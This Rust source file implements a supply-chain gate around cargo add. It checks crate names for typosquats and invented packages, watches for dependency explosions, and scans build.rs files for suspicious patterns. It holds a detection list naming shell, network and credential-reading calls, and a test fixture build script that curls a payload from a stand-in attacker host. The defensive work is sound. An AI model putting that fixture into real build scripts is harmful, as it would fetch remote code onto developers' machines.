//! `greengate cargo-add` — Zero-Trust cargo-add wrapper.
//!
//! **Layer 1 — Pre-flight typosquat check**
//! Crate names are compared against the 60 most-downloaded crates.io crates
//! using Levenshtein distance.  Any name within edit-distance 2 of a popular
//! crate (but not identical) is flagged before the install proceeds.
//!
//! **Layer 2 — build.rs static analysis (post-add)**
//! After `cargo add` updates `Cargo.toml`, `cargo fetch` is run to download
//! the new crates.  For each newly added crate, the `build.rs` in the cargo
//! registry cache (`~/.cargo/registry/src/`) is located and scanned for
//! suspicious patterns: network access, process spawning, filesystem writes
//! to unexpected locations, and high Shannon entropy.
//!
//! **Layer 3 — Dependency explosion guard**
//! After the add, the transitive dependency count in `Cargo.lock` is compared
//! to the pre-add count.  A single new crate that adds > 50 transitive deps
//! is flagged for manual review (common indicator of over-bundled or suspicious
//! crates).

use crate::deps::Source;
use crate::report::{Check, Finding, Report, Severity};
use crate::utils::terminal;
use anyhow::Result;
use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};

// ── Public API ────────────────────────────────────────────────────────────────

pub struct CargoAddOpts {
    /// Arguments forwarded verbatim to `cargo add`
    pub args: Vec<String>,
    /// Exit non-zero on any finding (default: true)
    pub no_fail: bool,
    /// Crate names whose findings are reported as warnings only
    pub allow_crates: Vec<String>,
    /// Run the slopsquat / hallucinated-package guard (registry-metadata check)
    pub slopsquat_check: bool,
    /// Age threshold (days) below which a newly-introduced crate is suspicious
    pub slopsquat_min_age_days: u64,
    /// Download threshold below which a newly-introduced crate is suspicious
    pub slopsquat_min_downloads: u64,
    /// Internal package patterns for the dependency-confusion check
    pub internal_packages: Vec<String>,
}

// ── Popular crates.io packages for typosquat detection ───────────────────────

/// The 60 most-downloaded crates.io packages used as the typosquat reference.
const CARGO_POPULAR: &[&str] = &[
    "serde",
    "tokio",
    "rand",
    "regex",
    "clap",
    "anyhow",
    "thiserror",
    "tracing",
    "log",
    "env_logger",
    "reqwest",
    "hyper",
    "axum",
    "actix-web",
    "rocket",
    "sqlx",
    "diesel",
    "rusqlite",
    "serde_json",
    "serde_yaml",
    "chrono",
    "time",
    "url",
    "uuid",
    "once_cell",
    "lazy_static",
    "itertools",
    "rayon",
    "crossbeam",
    "parking_lot",
    "bytes",
    "futures",
    "async-std",
    "smol",
    "criterion",
    "proptest",
    "nom",
    "pest",
    "winnow",
    "zip",
    "tar",
    "flate2",
    "hex",
    "base64",
    "ring",
    "rustls",
    "openssl",
    "toml",
    "indexmap",
    "ahash",
    "dashmap",
    "strum",
    "bitflags",
    "num",
    "libc",
    "nix",
    "mio",
    "prost",
    "tonic",
    "wasm-bindgen",
];

// ── Suspicious build.rs patterns ─────────────────────────────────────────────

/// (signal_name, substring) pairs checked in every build.rs file.
const BUILD_RS_SIGNALS: &[(&str, &str)] = &[
    // Network access
    ("TcpStream::connect", "TcpStream::connect"),
    ("UdpSocket::bind", "UdpSocket::bind"),
    ("reqwest", "reqwest"),
    ("ureq", "ureq::"),
    ("attohttpc", "attohttpc"),
    ("minreq", "minreq"),
    // Dynamic code execution
    ("Command::new", "Command::new"),
    ("process::Command", "process::Command"),
    ("std::process::Command", "std::process::Command"),
    // Filesystem writes outside build dir
    ("fs::write", "fs::write("),
    ("File::create", "File::create("),
    ("OpenOptions::new", "OpenOptions::new()"),
    // Credential exfiltration
    ("env::var", "env::var("),
    ("env::vars()", "env::vars()"),
    ("std::env::var", "std::env::var("),
    // Shell/script execution
    ("sh -c", "sh -c"),
    ("bash -c", "bash -c"),
    ("powershell", "powershell"),
    ("curl ", "curl "),
    ("wget ", "wget "),
    // Base64 / obfuscation
    ("base64::decode", "base64::decode"),
    ("from_utf8_unchecked", "from_utf8_unchecked"),
    // Dynamic loading
    ("libloading", "libloading"),
    ("dlopen", "dlopen("),
];

// ── Entry point ───────────────────────────────────────────────────────────────

pub fn run_cargo_add(opts: CargoAddOpts) -> Result<Report> {
    let mut report = Report::new("cargo-add");
    report.no_fail = opts.no_fail;
    terminal::info(&format!(
        "Zero-Trust Supply Chain Gate (cargo): intercepting `cargo add {}`",
        opts.args.join(" ")
    ));

    // ── Layer 1: Typosquat pre-flight ─────────────────────────────────────────
    let crates_to_add = extract_crate_names(&opts.args);
    let mut typosquats: Vec<(String, String)> = Vec::new();
    for krate in &crates_to_add {
        if let Some(candidate) = check_typosquat(krate) {
            typosquats.push((krate.clone(), candidate));
        }
    }
    if !typosquats.is_empty() {
        eprintln!();
        eprintln!(
            "⚠️  Zero-Trust Supply Chain Gate (cargo): {} potential typosquat(s) detected:",
            typosquats.len()
        );
        eprintln!();
        for (requested, closest) in &typosquats {
            eprintln!(
                "  [TYPOSQUAT] '{}' is suspiciously close to popular crate '{}'",
                requested, closest
            );
        }
        eprintln!();
        eprintln!("  Verify the exact crate name at https://crates.io before adding.");
        eprintln!();

        for (requested, closest) in &typosquats {
            let finding = Finding::package(
                "SUPPLY-CHAIN/TYPOSQUAT",
                Severity::High,
                "cargo",
                requested,
                format!("suspiciously close to popular crate '{closest}'"),
            );
            if is_allowlisted(requested, &opts.allow_crates) {
                report.warnings.push(finding);
            } else {
                report.findings.push(finding);
            }
        }
        if !report.findings.is_empty() && !opts.no_fail {
            eprintln!(
                "Zero-Trust Supply Chain Gate (cargo): {} potential typosquat(s) — halting before add.",
                report.findings.len()
            );
            return Ok(report);
        }
    }

    // ── Layer 1.5: Slopsquat / hallucinated-package guard ─────────────────────
    // Typosquat catches names *close to* a popular crate; a hallucinated name is
    // often novel, so we also score registry metadata (age, downloads, existence)
    // of any crate not already pinned in Cargo.lock.
    if opts.slopsquat_check {
        use crate::modules::slopsquat::{self, Ecosystem};
        let policy = slopsquat::GuardPolicy {
            slop: slopsquat::SlopConfig {
                min_age_days: opts.slopsquat_min_age_days,
                min_downloads: opts.slopsquat_min_downloads,
            },
            internal_patterns: opts.internal_packages.clone(),
        };
        let names: Vec<String> = crates_to_add
            .iter()
            .map(|k| k.split('@').next().unwrap_or(k).to_string())
            .collect();
        let lock = lock_crates("Cargo.lock");
        let in_lock = |name: &str| lock.keys().any(|e| e.split(' ').next() == Some(name));
        let reports = slopsquat::guard(
            Ecosystem::Cargo,
            &names,
            &opts.allow_crates,
            &in_lock,
            &policy,
            &mut report.checks,
        );
        let blocking = slopsquat::print_reports(Ecosystem::Cargo, &reports);
        slopsquat::record(Ecosystem::Cargo, &reports, &mut report);
        if blocking > 0 && !opts.no_fail {
            eprintln!(
                "Zero-Trust Supply Chain Gate (cargo): {blocking} high-suspicion slopsquat(s) — halting before add."
            );
            return Ok(report);
        }
    }

    // ── Pre-add Cargo.lock snapshot ───────────────────────────────────────────
    let pre_lock_crates: HashSet<String> = lock_crates("Cargo.lock").into_keys().collect();

    // ── Run cargo add ─────────────────────────────────────────────────────────
    let status = std::process::Command::new("cargo") // greengate: ignore — intentionally wrapping cargo to intercept the add
        .arg("add")
        .args(&opts.args)
        .status();

    match &status {
        Err(e) => {
            return Err(anyhow::anyhow!(
                "Failed to launch `cargo add`: {}. Is cargo installed?",
                e
            ));
        }
        Ok(s) if !s.success() => {
            return Err(anyhow::anyhow!(
                "`cargo add` failed ({s}) — Cargo.toml was not updated."
            ));
        }
        _ => {}
    }

    // build.rs scanning reads the fetched sources; without them nothing new
    // can be scanned, and that must not look like a clean result.
    let fetched = std::process::Command::new("cargo") // greengate: ignore — fetching registry sources after add
        .args(["fetch", "--quiet"])
        .status();
    match fetched {
        Ok(s) if s.success() => {}
        Ok(s) => report.checks.push(Check::incomplete(
            "cargo-fetch",
            format!("`cargo fetch` failed ({s}); new crates' sources may be missing"),
        )),
        Err(e) => report.checks.push(Check::incomplete(
            "cargo-fetch",
            format!("`cargo fetch` could not run: {e}"),
        )),
    }

    // ── Layer 3: Dependency explosion guard ───────────────────────────────────
    let post_lock = lock_crates("Cargo.lock");
    let post_lock_crates: HashSet<String> = post_lock.keys().cloned().collect();
    let new_crates: Vec<String> = post_lock_crates
        .difference(&pre_lock_crates)
        .cloned()
        .collect();

    let transitive_count = new_crates.len().saturating_sub(crates_to_add.len());
    if transitive_count > 50 {
        eprintln!();
        eprintln!(
            "⚠️  Zero-Trust Supply Chain Gate (cargo): adding {} crate(s) pulled in {} transitive \
             dependencies — review the full dependency tree with `cargo tree`.",
            crates_to_add.len(),
            transitive_count
        );
        eprintln!();
    }

    // ── Layer 2: build.rs static analysis ────────────────────────────────────
    let registry_src = locate_cargo_registry_src();
    let mut build_threats: Vec<BuildRsThreat> = Vec::new();

    let mut not_scanned: Vec<String> = Vec::new();
    for crate_id in &new_crates {
        // Lock entries are "name version", e.g. "serde 1.0.197".
        let mut parts = crate_id.split_whitespace();
        let (Some(name_only), Some(version)) = (parts.next(), parts.next()) else {
            continue;
        };
        let build_rs = match post_lock.get(crate_id) {
            // The project's own code (a workspace or path crate).
            Some((_, true)) => continue,
            Some((Source::Registry { .. }, _)) => {
                match find_build_script(&registry_src, name_only, version) {
                    CrateSource::BuildScript(path) => path,
                    CrateSource::NoBuildScript => continue,
                    CrateSource::Missing => {
                        not_scanned.push(format!("{crate_id} (source not found)"));
                        continue;
                    }
                }
            }
            Some(_) => {
                not_scanned.push(format!("{crate_id} (git/other source)"));
                continue;
            }
            None => {
                not_scanned.push(format!("{crate_id} (not in Cargo.lock)"));
                continue;
            }
        };
        let Ok(src) = std::fs::read_to_string(&build_rs) else {
            not_scanned.push(format!("{crate_id} (build script unreadable)"));
            continue;
        };
        {
            let signals = scan_build_rs_signals(&src);
            let max_entropy = max_entropy_score(&src);
            const ENTROPY_THRESHOLD: f64 = 4.8;
            if !signals.is_empty() || max_entropy > ENTROPY_THRESHOLD {
                build_threats.push(BuildRsThreat {
                    krate: name_only.to_string(),
                    path: build_rs,
                    signals,
                    max_entropy,
                });
            }
        }
    }

    if !not_scanned.is_empty() {
        report.checks.push(Check::incomplete(
            "build-scripts",
            format!("build scripts not scanned for: {}", not_scanned.join(", ")),
        ));
    }

    // ── Report ─────────────────────────────────────────────────────────────────
    let mut any_blocking = false;

    if !build_threats.is_empty() {
        eprintln!();
        eprintln!(
            "⚠️  Zero-Trust Supply Chain Gate (cargo): {} crate(s) with suspicious build.rs:",
            build_threats.len()
        );
        eprintln!();
        for t in &build_threats {
            let allowed = is_allowlisted(&t.krate, &opts.allow_crates);
            let tag = if allowed { " [allowlisted]" } else { "" };
            eprintln!("  [BUILD_RS] {} — {}{}", t.krate, t.path.display(), tag);
            if !t.signals.is_empty() {
                eprintln!("    Signals  : {}", t.signals.join(", "));
            }
            if t.max_entropy > 4.8 {
                eprintln!(
                    "    Entropy  : {:.2}  (threshold 4.80 — likely obfuscated)",
                    t.max_entropy
                );
            }
            let finding = Finding::in_file(
                "SUPPLY-CHAIN/BUILD_RS",
                Severity::High,
                &t.path,
                0,
                format!(
                    "{}: {}",
                    t.krate,
                    if t.signals.is_empty() {
                        format!("entropy {:.2}", t.max_entropy)
                    } else {
                        t.signals.join(", ")
                    }
                ),
            );
            if allowed {
                report.warnings.push(finding);
            } else {
                any_blocking = true;
                report.findings.push(finding);
            }
        }
        eprintln!();
        eprintln!(
            "  Tip: review the build.rs manually — build scripts run arbitrary code at \
             compile time with full OS access.\n  \
             Add the crate to [supply_chain] allow_cargo_crates to suppress."
        );
        eprintln!();
    }

    if any_blocking && !opts.no_fail {
        eprintln!("Zero-Trust Supply Chain Gate (cargo): blocking build.rs finding(s) detected.");
    }

    if typosquats.is_empty() && build_threats.is_empty() && report.unfinished().next().is_none() {
        terminal::success(
            "Zero-Trust Supply Chain Gate (cargo): clean — no typosquats or suspicious \
             build scripts detected.",
        );
    }

    report.print_unfinished();
    Ok(report)
}

// ── Internal types ────────────────────────────────────────────────────────────

struct BuildRsThreat {
    krate: String,
    path: PathBuf,
    signals: Vec<String>,
    max_entropy: f64,
}

// ── Helpers ───────────────────────────────────────────────────────────────────

/// Extract crate names from `cargo add` args (strip feature flags and version specs).
fn extract_crate_names(args: &[String]) -> Vec<String> {
    let mut names = Vec::new();
    let mut skip_next = false;
    for arg in args {
        if skip_next {
            skip_next = false;
            continue;
        }
        // skip flags that take a value
        if matches!(
            arg.as_str(),
            "--features"
                | "-F"
                | "--rename"
                | "--manifest-path"
                | "--target"
                | "--branch"
                | "--tag"
                | "--rev"
                | "--git"
                | "--path"
                | "--registry"
                | "-p"
                | "--package"
        ) {
            skip_next = true;
            continue;
        }
        if arg.starts_with('-') {
            continue;
        }
        // Strip version spec: serde@1.0 → serde
        let name = arg.split('@').next().unwrap_or(arg).trim().to_lowercase();
        if !name.is_empty() {
            names.push(name);
        }
    }
    names
}

/// Returns the closest popular crate name if `krate` looks like a typosquat.
fn check_typosquat(krate: &str) -> Option<String> {
    let norm = krate.to_lowercase().replace('-', "_");
    for &popular in CARGO_POPULAR {
        let pop_norm = popular.to_lowercase().replace('-', "_");
        if norm == pop_norm {
            return None;
        }
        if norm.len() < 4 || pop_norm.len() < 4 {
            continue;
        }
        let dist = levenshtein(&norm, &pop_norm);
        if dist <= 2 {
            return Some(popular.to_string());
        }
    }
    None
}

/// Every package in a `Cargo.lock`, as `"name version"` → (source, whether
/// it is the project's own code). Empty when there is no readable lockfile.
fn lock_crates(path: &str) -> HashMap<String, (Source, bool)> {
    crate::deps::load(Path::new(path))
        .map(|lock| {
            lock.packages
                .into_iter()
                .map(|p| (format!("{} {}", p.name, p.version), (p.source, p.member)))
                .collect()
        })
        .unwrap_or_default()
}

/// Locate the cargo registry source cache directory.
/// Typically `~/.cargo/registry/src/`.
fn locate_cargo_registry_src() -> PathBuf {
    // Prefer CARGO_HOME env var
    if let Ok(cargo_home) = std::env::var("CARGO_HOME") {
        let p = PathBuf::from(cargo_home).join("registry").join("src");
        if p.is_dir() {
            return p;
        }
    }
    // Fallback to ~/.cargo
    if let Some(home) = home_dir() {
        let p = home.join(".cargo").join("registry").join("src");
        if p.is_dir() {
            return p;
        }
    }
    PathBuf::from(".cargo/registry/src")
}

/// Where a registry crate's build script is, if it has one.
enum CrateSource {
    /// The crate's source directory is not in the registry cache.
    Missing,
    NoBuildScript,
    BuildScript(PathBuf),
}

/// Find the build script of exactly `name`-`version` under the registry src
/// dir (`<registry_src>/<index-hash>/<name>-<version>/`). Matching the exact
/// directory matters: a prefix match would scan `serde_json` for `serde`, or
/// another cached version of the same crate.
fn find_build_script(registry_src: &Path, name: &str, version: &str) -> CrateSource {
    let dir_name = format!("{name}-{version}");
    let Ok(indexes) = std::fs::read_dir(registry_src) else {
        return CrateSource::Missing;
    };
    for index in indexes.flatten() {
        let crate_dir = index.path().join(&dir_name);
        if crate_dir.is_dir() {
            return match build_script_path(&crate_dir) {
                Some(path) => CrateSource::BuildScript(path),
                None => CrateSource::NoBuildScript,
            };
        }
    }
    CrateSource::Missing
}

/// The build script a crate declares: `package.build` in its Cargo.toml (a
/// path, or `false` for none), else `build.rs` if present.
fn build_script_path(crate_dir: &Path) -> Option<PathBuf> {
    let manifest = std::fs::read_to_string(crate_dir.join("Cargo.toml"))
        .ok()
        .and_then(|m| m.parse::<toml::Table>().ok());
    let declared = manifest
        .as_ref()
        .and_then(|m| m.get("package"))
        .and_then(|p| p.get("build"));
    match declared {
        Some(toml::Value::Boolean(false)) => None,
        Some(toml::Value::String(path)) => Some(crate_dir.join(path)),
        _ => Some(crate_dir.join("build.rs")).filter(|p| p.is_file()),
    }
}

fn scan_build_rs_signals(source: &str) -> Vec<String> {
    BUILD_RS_SIGNALS
        .iter()
        .filter(|(_, needle)| source.contains(needle))
        .map(|(name, _)| name.to_string())
        .collect()
}

fn max_entropy_score(text: &str) -> f64 {
    const WINDOW: usize = 64;
    let bytes = text.as_bytes();
    if bytes.len() < 32 {
        return 0.0;
    }
    let mut max = 0.0_f64;
    let end = bytes.len().saturating_sub(WINDOW - 1);
    for start in 0..end {
        let window = &bytes[start..start + WINDOW];
        let mut freq = [0u32; 256];
        for &b in window {
            freq[b as usize] += 1;
        }
        let entropy: f64 = freq
            .iter()
            .filter(|&&c| c > 0)
            .map(|&c| {
                let p = c as f64 / WINDOW as f64;
                -p * p.log2()
            })
            .sum();
        if entropy > max {
            max = entropy;
        }
    }
    max
}

fn is_allowlisted(krate: &str, allowlist: &[String]) -> bool {
    allowlist
        .iter()
        .any(|a| a.to_lowercase() == krate.to_lowercase())
}

/// Home directory helper (cross-platform).
fn home_dir() -> Option<PathBuf> {
    std::env::var("HOME")
        .ok()
        .or_else(|| std::env::var("USERPROFILE").ok())
        .map(PathBuf::from)
}

/// Levenshtein edit distance.
#[allow(clippy::needless_range_loop)]
fn levenshtein(a: &str, b: &str) -> usize {
    let a: Vec<char> = a.chars().collect();
    let b: Vec<char> = b.chars().collect();
    let (m, n) = (a.len(), b.len());
    if m == 0 {
        return n;
    }
    if n == 0 {
        return m;
    }
    if m.abs_diff(n) > 3 {
        return m.abs_diff(n);
    }
    let mut dp = vec![vec![0usize; n + 1]; m + 1];
    for i in 0..=m {
        dp[i][0] = i;
    }
    for j in 0..=n {
        dp[0][j] = j;
    }
    for i in 1..=m {
        for j in 1..=n {
            dp[i][j] = if a[i - 1] == b[j - 1] {
                dp[i - 1][j - 1]
            } else {
                1 + dp[i - 1][j - 1].min(dp[i - 1][j]).min(dp[i][j - 1])
            };
        }
    }
    dp[m][n]
}

// ── Unit tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn typosquat_detects_serde_variant() {
        // "serce" is edit-distance 2 from "serde"
        let result = check_typosquat("serce");
        assert_eq!(result.as_deref(), Some("serde"));
    }

    #[test]
    fn typosquat_exact_match_not_flagged() {
        assert!(check_typosquat("serde").is_none());
        assert!(check_typosquat("tokio").is_none());
        assert!(check_typosquat("reqwest").is_none());
    }

    #[test]
    fn typosquat_clearly_different_not_flagged() {
        assert!(check_typosquat("my_totally_unique_crate_xyz").is_none());
    }

    #[test]
    fn typosquat_tokio_variant() {
        // "tokoi" — transposition — edit distance 2
        let result = check_typosquat("tokoi");
        assert_eq!(result.as_deref(), Some("tokio"));
    }

    #[test]
    fn typosquat_hyphen_underscore_normalised() {
        // "actix_web" should not be flagged against "actix-web"
        assert!(check_typosquat("actix_web").is_none());
    }

    #[test]
    fn extract_crate_names_basic() {
        let args: Vec<String> = ["serde", "tokio@1.0", "--features", "full"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        let names = extract_crate_names(&args);
        assert_eq!(names, vec!["serde", "tokio"]);
    }

    #[test]
    fn extract_crate_names_skips_flags() {
        let args: Vec<String> = ["--no-default-features", "anyhow", "-F", "backtrace"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        let names = extract_crate_names(&args);
        assert_eq!(names, vec!["anyhow"]);
    }

    #[test]
    fn lock_crates_reads_names_versions_and_sources() {
        let lock = r#"
[[package]]
name = "serde"
version = "1.0.197"
source = "registry+https://github.com/rust-lang/crates.io-index"

[[package]]
name = "tokio"
version = "1.37.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
"#;
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("Cargo.lock");
        std::fs::write(&path, lock).unwrap();
        let set = lock_crates(path.to_str().unwrap());
        assert!(matches!(
            set.get("serde 1.0.197"),
            Some((Source::Registry { .. }, false))
        ));
        assert!(set.contains_key("tokio 1.37.0"));
    }

    #[test]
    fn find_build_script_matches_the_exact_crate_and_version() {
        let reg = tempfile::tempdir().unwrap();
        let index = reg.path().join("index.crates.io-abc");
        for dir in ["serde_json-1.0.0", "serde-1.0.1", "serde-1.0.2"] {
            std::fs::create_dir_all(index.join(dir)).unwrap();
        }
        // Only an unrelated crate and another version carry a build.rs.
        std::fs::write(index.join("serde_json-1.0.0/build.rs"), "fn main(){}").unwrap();
        std::fs::write(index.join("serde-1.0.1/build.rs"), "fn main(){}").unwrap();

        assert!(matches!(
            find_build_script(reg.path(), "serde", "1.0.2"),
            CrateSource::NoBuildScript
        ));
        assert!(matches!(
            find_build_script(reg.path(), "serde", "9.9.9"),
            CrateSource::Missing
        ));
        let CrateSource::BuildScript(p) = find_build_script(reg.path(), "serde", "1.0.1") else {
            panic!("expected serde-1.0.1/build.rs");
        };
        assert!(p.ends_with("serde-1.0.1/build.rs"));
    }

    #[test]
    fn build_script_path_honours_the_build_key() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("Cargo.toml"),
            "[package]\nname = \"x\"\nbuild = \"tools/gen.rs\"\n",
        )
        .unwrap();
        assert_eq!(
            build_script_path(dir.path()),
            Some(dir.path().join("tools/gen.rs"))
        );
        std::fs::write(
            dir.path().join("Cargo.toml"),
            "[package]\nname = \"x\"\nbuild = false\n",
        )
        .unwrap();
        std::fs::write(dir.path().join("build.rs"), "").unwrap();
        assert_eq!(build_script_path(dir.path()), None);
    }

    #[test]
    fn scan_build_rs_detects_command() {
        let src = r#"
fn main() {
    let out = std::process::Command::new("curl")
        .arg("https://evil.example.com/drop.sh")
        .output().unwrap();
}
"#;
        let signals = scan_build_rs_signals(src);
        assert!(signals.iter().any(|s| s.contains("Command")));
    }

    #[test]
    fn scan_build_rs_clean_file_no_signals() {
        let src = r#"
fn main() {
    println!("cargo:rerun-if-changed=build.rs");
}
"#;
        let signals = scan_build_rs_signals(src);
        assert!(signals.is_empty());
    }

    #[test]
    fn levenshtein_identical() {
        assert_eq!(levenshtein("serde", "serde"), 0);
    }

    #[test]
    fn levenshtein_transposition() {
        assert_eq!(levenshtein("tokio", "tokoi"), 2);
    }

    #[test]
    fn allowlist_case_insensitive() {
        let allow = vec!["OpenSSL".to_string()];
        assert!(is_allowlisted("openssl", &allow));
    }
}
